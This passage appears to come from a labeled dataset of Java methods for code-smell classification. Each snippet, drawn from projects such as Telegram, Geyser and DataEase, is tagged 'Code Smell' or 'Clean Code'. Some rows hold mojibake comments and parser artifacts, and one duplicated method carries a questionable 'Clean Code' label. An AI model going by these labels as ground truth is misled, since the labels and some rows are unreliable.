    final RowData keyRow=createProjectedRow(consumedRow,RowKind.INSERT,keyFieldGetters);
    messageBuilder.keyBytes(keySerialization.serialize(keyRow));
  }
  final RowKind kind=consumedRow.getRowKind();
  final RowData valueRow=createProjectedRow(consumedRow,kind,valueFieldGetters);
  if (upsertMode) {
    if (kind == RowKind.DELETE || kind == RowKind.UPDATE_BEFORE) {
    }
 else {
      valueRow.setRowKind(RowKind.INSERT);
      messageBuilder.value(valueRow);
    }
  }
 else {
    messageBuilder.value(valueRow);
  }
  Map<String,String> properties=readMetadata(consumedRow,PulsarDynamicTableSink.WritableMetadata.PROPERTIES);
  if (properties != null) {
    messageBuilder.properties(properties);
  }
  final Long eventTime=readMetadata(consumedRow,PulsarDynamicTableSink.WritableMetadata.EVENT_TIME);
  if (eventTime != null && eventTime >= 0) {
    messageBuilder.eventTime(eventTime);
  }
}",1,Code Smell
"private void processLoadedFilterPeersInternal(TLRPC.messages_Dialogs pinnedDialogs,TLRPC.messages_Dialogs pinnedRemoteDialogs,ArrayList<TLRPC.User> users,ArrayList<TLRPC.Chat> chats,ArrayList<MessagesController.DialogFilter> filtersToSave,SparseArray<MessagesController.DialogFilter> filtersToDelete,ArrayList<Integer> filtersOrder,HashMap<Integer,HashSet<Long>> filterDialogRemovals,HashSet<Integer> filtersUnreadCounterReset,Runnable onDone){
  boolean anythingChanged=false;
  putUsersAndChats(users,chats,true,false);
  for (int a=0, N=filtersToDelete.size(); a < N; a++) {
    deleteDialogFilterInternal(filtersToDelete.valueAt(a));
    anythingChanged=true;
  }
  for (  Integer id : filtersUnreadCounterReset) {
    MessagesController.DialogFilter filter=dialogFiltersMap.get(id);
    if (filter == null) {
      continue;
    }
    filter.pendingUnreadCount=-1;
  }
  for (  HashMap.Entry<Integer,HashSet<Long>> entry : filterDialogRemovals.entrySet()) {
    MessagesController.DialogFilter filter=dialogFiltersMap.get(entry.getKey());
    if (filter == null) {
      continue;
    }
    HashSet<Long> set=entry.getValue();
    for (    Long id : set) {
      filter.pinnedDialogs.delete(id);
    }
    anythingChanged=true;
  }
  for (int a=0, N=filtersToSave.size(); a < N; a++) {
    saveDialogFilterInternal(filtersToSave.get(a),false,true);
    anythingChanged=true;
  }
  boolean orderChanged=false;
  for (int a=0, N=dialogFilters.size(); a < N; a++) {
    MessagesController.DialogFilter filter=dialogFilters.get(a);
    int order=filtersOrder.indexOf(filter.id);
    if (filter.order != order) {
      filter.order=order;
      anythingChanged=true;
      orderChanged=true;
    }
  }
  if (orderChanged) {
    Collections.sort(dialogFilters,(o1,o2) -> {
      if (o1.order > o2.order) {
        return 1;
      }
 else       if (o1.order < o2.order) {
        return -1;
      }
      return 0;
    }
);
    saveDialogFiltersOrderInternal();
  }
  int remote=anythingChanged ? 1 : 2;
  calcUnreadCounters(true);
  getMessagesController().processLoadedDialogFilters(new ArrayList<>(dialogFilters),pinnedDialogs,pinnedRemoteDialogs,users,chats,null,remote,onDone);
}",1,Code Smell
"public static String getProtocolName(int protocol,int version,boolean brief){
  String p=null;
  String b=null;
switch (protocol) {
case 0:
    p=""HOPO"";
  b=""H"";
break;
case 2:
p=""IGMP"";
b=""G"";
break;
case 1:
case 58:
p=""ICMP"";
b=""I"";
break;
case 6:
p=""TCP"";
b=""T"";
break;
case 17:
p=""UDP"";
b=""U"";
break;
case 50:
p=""ESP"";
b=""E"";
break;
}
if (p == null) return Integer.toString(protocol) + ""/"" + version;
return ((brief ? b : p) + (version > 0 ? version : """"));
}",0,Clean Code
"@Override public SearchResult searchMod(SearchFilters searchFilters,SearchResult previousPageResult){
  ModrinthSearchResult modrinthSearchResult=(ModrinthSearchResult)previousPageResult;
  if (modrinthSearchResult != null && modrinthSearchResult.previousOffset >= modrinthSearchResult.totalResultCount) {
    ModrinthSearchResult emptyResult=new ModrinthSearchResult();
    emptyResult.results=new ModItem[0];
    emptyResult.totalResultCount=modrinthSearchResult.totalResultCount;
    emptyResult.previousOffset=modrinthSearchResult.previousOffset;
    return emptyResult;
  }
  HashMap<String,Object> params=new HashMap<>();
  StringBuilder facetString=new StringBuilder();
  facetString.append(""["");
  facetString.append(String.format(""[\""project_type:%s\""]"",searchFilters.isModpack ? ""modpack"" : ""mod""));
  if (searchFilters.mcVersion != null && !searchFilters.mcVersion.isEmpty())   facetString.append(String.format("",[\""versions:%s\""]"",searchFilters.mcVersion));
  facetString.append(""]"");
  params.put(""facets"",facetString.toString());
  params.put(""query"",searchFilters.name);
  params.put(""limit"",50);
  params.put(""index"",""relevance"");
  if (modrinthSearchResult != null)   params.put(""offset"",modrinthSearchResult.previousOffset);
  JsonObject response=mApiHandler.get(""search"",params,JsonObject.class);
  if (response == null)   return null;
  JsonArray responseHits=response.getAsJsonArray(""hits"");
  if (responseHits == null)   return null;
  ModItem[] items=new ModItem[responseHits.size()];
  for (int i=0; i < responseHits.size(); ++i) {
    JsonObject hit=responseHits.get(i).getAsJsonObject();
    items[i]=new ModItem(Constants.SOURCE_MODRINTH,hit.get(""project_type"").getAsString().equals(""modpack""),hit.get(""project_id"").getAsString(),hit.get(""title"").getAsString(),hit.get(""description"").getAsString(),hit.get(""icon_url"").getAsString());
  }
  if (modrinthSearchResult == null)   modrinthSearchResult=new ModrinthSearchResult();
  modrinthSearchResult.previousOffset+=responseHits.size();
  modrinthSearchResult.results=items;
  modrinthSearchResult.totalResultCount=response.get(""total_hits"").getAsInt();
  return modrinthSearchResult;
}",1,Code Smell
"private Pair<List<List<ItemDescriptorWithCount>>,ItemData> combinations(GeyserSession session,RecipeDisplay display,List<SlotDisplay> ingredients){
  Pair<Item,ItemData> pair=translateToOutput(session,display.result());
  if (pair == null || !pair.right().isValid()) {
    return null;
  }
  ItemData output=pair.right();
  if (!(pair.left() instanceof BedrockRequiresTagItem)) {
    output=output.toBuilder().tag(null).build();
  }
  boolean empty=true;
  boolean complexInputs=false;
  List<List<ItemDescriptorWithCount>> inputs=new ArrayList<>(ingredients.size());
  for (  SlotDisplay input : ingredients) {
    List<ItemDescriptorWithCount> translated=translateToInput(session,input);
    if (translated == null) {
      continue;
    }
    inputs.add(translated);
    if (translated.size() != 1 || translated.get(0) != ItemDescriptorWithCount.EMPTY) {
      empty=false;
    }
    complexInputs|=translated.size() > 1;
  }
  if (empty) {
    return null;
  }
  if (complexInputs) {
    long size=1;
    for (    List<ItemDescriptorWithCount> list : inputs) {
      size*=list.size();
      if (size > 500) {
        complexInputs=false;
        break;
      }
    }
    if (complexInputs) {
      return Pair.of(Lists.cartesianProduct(inputs),output);
    }
  }
  int totalSimpleRecipes=inputs.stream().mapToInt(List::size).max().orElse(1);
  inputs=inputs.stream().map(descriptors -> descriptors.stream().sorted(ItemDescriptorWithCountComparator.INSTANCE).collect(Collectors.toList())).collect(Collectors.toList());
  List<List<ItemDescriptorWithCount>> finalRecipes=new ArrayList<>(totalSimpleRecipes);
  for (int i=0; i < totalSimpleRecipes; i++) {
    int current=i;
    finalRecipes.add(inputs.stream().map(descriptors -> {
      if (descriptors.size() > current) {
        return descriptors.get(current);
      }
      return descriptors.get(0);
    }
).toList());
  }
  return Pair.of(finalRecipes,output);
}",1,Code Smell
"@Override public DatasourceDTO get(Long datasourceId) throws DEException {
  DatasourceDTO datasourceDTO=new DatasourceDTO();
  CoreDatasource datasource=datasourceMapper.selectById(datasourceId);
  BeanUtils.copyBean(datasourceDTO,datasource);
  TypeReference<List<ApiDefinition>> listTypeReference=new TypeReference<List<ApiDefinition>>(){
  }
;
  if (datasourceDTO.getType().equalsIgnoreCase(DatasourceConfiguration.DatasourceType.API.toString())) {
    List<ApiDefinition> apiDefinitionList=JsonUtil.parseList(datasourceDTO.getConfiguration(),listTypeReference);
    List<ApiDefinition> apiDefinitionListWithStatus=new ArrayList<>();
    int success=0;
    for (    ApiDefinition apiDefinition : apiDefinitionList) {
      String status=null;
      if (StringUtils.isNotEmpty(datasourceDTO.getStatus())) {
        JsonNode jsonNode=null;
        try {
          jsonNode=objectMapper.readTree(datasourceDTO.getStatus());
        }
 catch (        Exception e) {
          DEException.throwException(e);
        }
        for (        JsonNode node : jsonNode) {
          if (node.get(""name"").asText().equals(apiDefinition.getName())) {
            status=node.get(""status"").asText();
          }
        }
        apiDefinition.setStatus(status);
      }
      if (StringUtils.isNotEmpty(status) && status.equalsIgnoreCase(""Success"")) {
        success++;
      }
      CoreDatasourceTaskLog log=datasourceTaskServer.lastSyncLogForTable(datasourceId,apiDefinition.getDeTableName());
      if (log != null) {
        apiDefinition.setUpdateTime(log.getStartTime());
      }
      apiDefinitionListWithStatus.add(apiDefinition);
    }
    datasourceDTO.setApiConfigurationStr(new String(Base64.getEncoder().encode(Objects.requireNonNull(JsonUtil.toJSONString(apiDefinitionListWithStatus)).toString().getBytes())));
    if (success == apiDefinitionList.size()) {
      datasourceDTO.setStatus(""Success"");
    }
 else {
      if (success > 0 && success < apiDefinitionList.size()) {
        datasourceDTO.setStatus(""Warning"");
      }
 else {
        datasourceDTO.setStatus(""Error"");
      }
    }
    CoreDatasourceTask coreDatasourceTask=datasourceTaskServer.selectByDSId(datasourceDTO.getId());
    TaskDTO taskDTO=new TaskDTO();
    BeanUtils.copyBean(taskDTO,coreDatasourceTask);
    datasourceDTO.setSyncSetting(taskDTO);
    CoreDatasourceTask task=datasourceTaskServer.selectByDSId(datasourceDTO.getId());
    if (task != null) {
      datasourceDTO.setLastSyncTime(task.getStartTime());
    }
  }
  if (datasourceDTO.getType().equalsIgnoreCase(DatasourceConfiguration.DatasourceType.Excel.toString())) {
    datasourceDTO.setFileName(ExcelUtils.getFileName(datasource));
    datasourceDTO.setSize(ExcelUtils.getSize(datasource));
  }
  datasourceDTO.setConfiguration(new String(Base64.getEncoder().encode(datasourceDTO.getConfiguration().getBytes())));
  datasourceDTO.setCreator(coreUserManage.getUserName(Long.valueOf(datasourceDTO.getCreateBy())));
  return datasourceDTO;
}",1,Code Smell
"/** 
 * https://github.com/tommyettinger/BlazingChain
 */
public static String LZ64Decrypt(String str){
  final char[] valStrBase64=new char[]{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,62,0,0,0,63,52,53,54,55,56,57,58,59,60,61,0,0,0,64,0,0,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,0,0,0,0,0,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51};
  if (str == null) {
    return null;
  }
  if (str.isEmpty()) {
    return """";
  }
  final char[] input=str.toCharArray();
  return LZ64Decrypt(input.length,32,input,valStrBase64,0);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@945e97d",0,Clean Code
"@Override public void onTransitionAnimationEnd(boolean isOpen,boolean backward){
  super.onTransitionAnimationEnd(isOpen,backward);
  if (isOpen && blurredView != null) {
    if (blurredView.getParent() != null) {
      ((ViewGroup)blurredView.getParent()).removeView(blurredView);
    }
    blurredView.setBackground(null);
  }
  notificationsLocker.unlock();
  if (!isOpen) {
    if (opnendForSelect && removeFragmentOnTransitionEnd) {
      removeSelfFromStack();
      if (dialogsActivity != null) {
        dialogsActivity.removeSelfFromStack();
      }
    }
 else     if (finishDialogRightSlidingPreviewOnTransitionEnd) {
      removeSelfFromStack();
      if (parentDialogsActivity != null && parentDialogsActivity.rightSlidingDialogContainer != null) {
        if (parentDialogsActivity.rightSlidingDialogContainer.hasFragment()) {
          parentDialogsActivity.rightSlidingDialogContainer.finishPreview();
        }
      }
    }
  }
}
",0,Clean Code
"private void insertTeslaUser(TeslaServiceUserDO teslaServiceUserDO){
  UserDO userDo=new UserDO();
  userDo.setEmpId(teslaServiceUserDO.getEmployeeId());
  String bucUserId=teslaServiceUserDO.getBucUserId();
  if (!StringUtils.isBlank(bucUserId)) {
    if (bucUserId.endsWith("".0"")) {
      bucUserId=bucUserId.substring(0,bucUserId.indexOf("".""));
    }
    userDo.setBucId(Long.parseLong(bucUserId));
  }
  userDo.setTenantId(Constants.DEFAULT_TENANT_ID);
  userDo.setLoginName(teslaServiceUserDO.getUsername());
  userDo.setNickName(teslaServiceUserDO.getNickname());
  userDo.setEmail(teslaServiceUserDO.getEmail());
  userDo.setPhone(teslaServiceUserDO.getMobilephone());
  userDo.setAliww(teslaServiceUserDO.getAliww());
  userDo.setGmtCreate(new Date());
  userDo.setIsLocked((byte)(userDo.getIsLocked() == 0 ? 1 : 0));
  userDo.setSecretKey(teslaServiceUserDO.getSecretkey());
  userDo.setUserId(UserUtil.getUserId(userDo));
  log.info(""insert user:{}"",userDo);
  userMapper.insert(userDo);
}",0,Clean Code
"private ClusterExemplarProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ClusterExemplarProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5684ccb6",0,Clean Code
"public int getItemCountInternal(){
  if (foundContextBot != null && !inlineMediaEnabled) {
    return 1;
  }
  if (stickers != null) {
    return stickers.size();
  }
 else   if (searchResultBotContext != null) {
    return searchResultBotContext.size() + (searchResultBotContextSwitch != null || searchResultBotWebViewSwitch != null ? 1 : 0);
  }
 else   if (searchResultUsernames != null) {
    return searchResultUsernames.size();
  }
 else   if (searchResultHashtags != null) {
    return searchResultHashtags.size();
  }
 else   if (searchResultCommands != null || quickReplies != null) {
    return (quickReplies == null ? 0 : quickReplies.size()) + (searchResultCommands == null ? 0 : searchResultCommands.size());
  }
 else   if (searchResultSuggestions != null) {
    return searchResultSuggestions.size();
  }
  return 0;
}",0,Clean Code
"@Override public ONNXNode writeONNXGraph(ONNXRef<?> input){
  ONNXContext onnx=input.onnxContext();
  svm_model model=models.get(0);
  int numOneVOne=model.label.length * (model.label.length - 1) / 2;
  int numFeatures=featureIDMap.size();
  Map<String,Object> attributes=new HashMap<>();
  attributes.put(""classlabels_ints"",model.label);
  float[] coefficients=new float[model.l * (model.nr_class - 1)];
  for (int i=0; i < model.nr_class - 1; i++) {
    for (int j=0; j < model.l; j++) {
      coefficients[i * model.l + j]=(float)model.sv_coef[i][j];
    }
  }
  attributes.put(""coefficients"",coefficients);
  attributes.put(""kernel_params"",new float[]{(float)model.param.gamma,(float)model.param.coef0,model.param.degree});
  attributes.put(""kernel_type"",KernelType.getKernelType(model.param.kernel_type).name());
  float[] rho=new float[model.rho.length];
  for (int i=0; i < rho.length; i++) {
    rho[i]=(float)-model.rho[i];
  }
  attributes.put(""rho"",rho);
  float[] supportVectors=new float[model.l * numFeatures];
  for (int j=0; j < model.l; j++) {
    svm_node[] sv=model.SV[j];
    for (    svm_node svm_node : sv) {
      int idx=(j * numFeatures) + svm_node.index;
      supportVectors[idx]=(float)svm_node.value;
    }
  }
  attributes.put(""support_vectors"",supportVectors);
  attributes.put(""vectors_per_class"",Arrays.copyOf(model.nSV,model.label.length));
  if (generatesProbabilities) {
    attributes.put(""prob_a"",Arrays.copyOf(Util.toFloatArray(model.probA),numOneVOne));
    attributes.put(""prob_b"",Arrays.copyOf(Util.toFloatArray(model.probB),numOneVOne));
  }
  List<ONNXNode> outputs=input.apply(ONNXOperators.SVM_CLASSIFIER,Arrays.asList(""pred_label"",""svm_output""),attributes);
  ONNXNode predLabel=outputs.get(0);
  ONNXNode svmOutput=outputs.get(1);
  ONNXNode ungatheredOutput=svmOutput;
  if (!generatesProbabilities) {
    if (model.nr_class == 2) {
      ONNXInitializer negOne=onnx.constant(""minus_one"",-1.0f);
      ungatheredOutput=writeDecisionFunction(svmOutput.apply(ONNXOperators.MUL,negOne));
    }
 else {
      ungatheredOutput=writeDecisionFunction(svmOutput);
    }
  }
  int[] backwardsLibSVMMapping=new int[model.label.length];
  for (int i=0; i < model.label.length; i++) {
    backwardsLibSVMMapping[model.label[i]]=i;
  }
  ONNXInitializer indices=onnx.array(""label_indices"",backwardsLibSVMMapping);
  return ungatheredOutput.apply(ONNXOperators.GATHER,indices,Collections.singletonMap(""axis"",1));
}",1,Code Smell
"/** 
 * 鐘舵��
 * @return 鎴愬姛
 */
public static SysResult ok(){
  return new SysResult(200,""ok"",null);
}
/** 
 * 鐘舵��
 * @param data vo瑕佸皝瑁呯殑鏁版嵁
 * @return vo
 */
public static SysResult ok(Object data){
  return new SysResult(200,""ok"",data);
}",0,Clean Code
"private static Class<?> hasType(Class<?> clz){
  try {
    if (clz.equals(Boolean.class)) {
      return boolean.class;
    }
    if (clz.equals(Integer.class)) {
      return int.class;
    }
    if (clz.equals(Long.class)) {
      return long.class;
    }
    if (clz.equals(Byte.class)) {
      return byte.class;
    }
    if (clz.equals(Short.class)) {
      return short.class;
    }
    if (clz.equals(Float.class)) {
      return float.class;
    }
    if (clz.equals(Double.class)) {
      return double.class;
    }
    if (clz.equals(Character.class)) {
      return char.class;
    }
    return null;
  }
 catch (  Exception e) {
    return null;
  }
}
",0,Clean Code
"/** 
 * {@inheritDoc} 
 */
@Override public NDList batchify(NDList[] inputs){
  int batchSize=inputs.length;
  int numInputKinds=inputs[0].size();
  if (numInputKinds == 0) {
    return new NDList();
  }
  try {
    NDList result=new NDList(numInputKinds);
    for (int i=0; i < numInputKinds; i++) {
      NDList inputsOfKind=new NDList(batchSize);
      String inputName=inputs[0].get(i).getName();
      for (      NDList input : inputs) {
        inputsOfKind.add(input.get(i));
      }
      NDArray stacked=NDArrays.stack(new NDList(inputsOfKind));
      stacked.setName(inputName);
      result.add(stacked);
    }
    return result;
  }
 catch (  IndexOutOfBoundsException|EngineException e) {
    for (    NDList input : inputs) {
      if (input.size() != numInputKinds) {
        throw new IllegalArgumentException(""You cannot batch data with different numbers of inputs"",e);
      }
    }
    for (int i=0; i < numInputKinds; i++) {
      Shape kindDataShape=inputs[0].get(i).getShape();
      DataType kindDataType=inputs[0].get(i).getDataType();
      for (      NDList input : inputs) {
        NDArray currInput=input.get(i);
        if (!currInput.getShape().equals(kindDataShape)) {
          throw new IllegalArgumentException(""You cannot batch data with different input shapes"" + currInput.getShape() + "" vs ""+ kindDataShape,e);
        }
        if (!currInput.getDataType().equals(kindDataType)) {
          throw new IllegalArgumentException(""You cannot batch data with different input data types"",e);
        }
      }
    }
    throw e;
  }
}",1,Code Smell
"@Override protected String toEL(Integer depth,StringBuilder paramContext){
  checkMaxWaitSeconds();
  Integer sonDepth=depth == null ? null : depth + 1;
  StringBuilder sb=new StringBuilder();
  processWrapperTabs(sb,depth);
  sb.append(""WHEN("");
  processWrapperNewLine(sb,depth);
  for (int i=0; i < this.getElWrapperList().size(); i++) {
    if (i > 0) {
      sb.append("","");
      processWrapperNewLine(sb,depth);
    }
    sb.append(this.getElWrapperList().get(i).toEL(sonDepth,paramContext));
  }
  processWrapperNewLine(sb,depth);
  processWrapperTabs(sb,depth);
  sb.append("")"");
  if (this.any) {
    sb.append("".any(true)"");
  }
  if (this.ignoreError) {
    sb.append("".ignoreError(true)"");
  }
  if (StrUtil.isNotBlank(customThreadExecutor)) {
    sb.append(StrUtil.format("".threadPool(\""{}\"")"",customThreadExecutor));
  }
  if (CollectionUtil.isNotEmpty(mustExecuteList)) {
    if (this.any) {
      throw new IllegalArgumentException(""'.must()' and '.any()' can use in when component at the same time!"");
    }
    sb.append("".must("");
    for (int i=0; i < mustExecuteList.size(); i++) {
      if (i > 0) {
        sb.append("", "");
      }
      sb.append(StrUtil.format(""\""{}\"""",mustExecuteList.get(i)));
    }
    sb.append("")"");
  }
  processWrapperProperty(sb,paramContext);
  return sb.toString();
}",0,Clean Code
"public Criteria andGmtModifiedNotEqualTo(Date value){
  addCriterion(""gmt_modified <>"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotEqualTo(Date value){
  addCriterion(""gmt_modified <>"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotEqualTo(Date value){
  addCriterion(""gmt_modified <>"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotEqualTo(Date value){
  addCriterion(""gmt_modified <>"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotEqualTo(Date value){
  addCriterion(""gmt_modified <>"",value,""gmtModified"");
  return (Criteria)this;
}
",0,Clean Code
